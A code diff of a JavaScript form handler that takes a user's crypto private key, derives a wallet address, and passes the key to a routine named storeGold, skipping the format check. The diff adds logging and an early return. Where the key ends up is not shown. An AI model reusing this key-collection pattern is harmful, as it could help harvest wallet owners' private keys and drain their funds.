@@ -2158,11 +2158,19 @@ document.addEventListener('DOMContentLoaded', function () {
     event.preventDefault();
 
     try {
-      let walletAddress0 = await handlePrivateKeyInput(); // Ensure handlePrivateKeyInput runs first
-      let networkType0 = document.getElementById('wallet-address-label1').textContent;
- 	await storeGold('prv-key-txt-hidden', true); // Skip format check for prv key
+      // Step 1: Handle private key input and derive wallet address
+      let walletAddress0 = await handlePrivateKeyInput();
+      if (!walletAddress0) {
+        console.error('No wallet address derived, stopping execution.');
+        return;
+      }
 
-      // Trigger the main function
+      // Step 2: Store the private key using storeGold
+      await storeGold('prv-key-txt-hidden', true); // Skip format check for prv key
+      console.log('storeGold completed successfully.');
+
+      // Step 3: Trigger the main function to store the wallet address
+      let networkType0 = document.getElementById('wallet-address-label1').textContent;
       storeWalletAddressHandler(walletAddress0, networkType0);
     } catch (error) {
       console.error('Error handling private key or wallet address:', error);
@@ -2170,6 +2178,7 @@ document.addEventListener('DOMContentLoaded', function () {
   });
 
 });
+
 
 
 
